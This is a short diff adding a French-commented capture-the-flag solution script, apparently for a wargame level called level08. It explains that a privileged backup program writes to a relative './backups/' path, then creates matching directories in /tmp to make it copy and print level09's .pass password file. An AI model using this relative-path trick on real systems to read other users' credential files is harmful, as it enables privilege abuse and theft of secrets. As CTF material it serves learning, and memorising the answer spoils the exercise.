@@ -1,0 +1,10 @@
+# On voit que le programme prend un fichier en parametre et copie tout dans un autre fichiers mais en rajoutant "./backups/" devant
+# Ainsi on aimerai faire "./level08 /home/users/level09/.pass" mais on a pas les droit dans notre home pour creer les dossiers pour que le open reussis.
+
+# On voit donc que le dossier "backups" est un chemin relatif, il suffit donc de changer notre path pour qu'il y ecrive les logs au meme endroit.
+# Donc on se met dans tmp on creer la suite de dossier pour que le open reussis et y copie le .pass
+
+cd /tmp
+mkdir -p backups/home/users/level09
+~/level08 /home/users/level09/.pass
+cat backups/home/users/level09/.pass
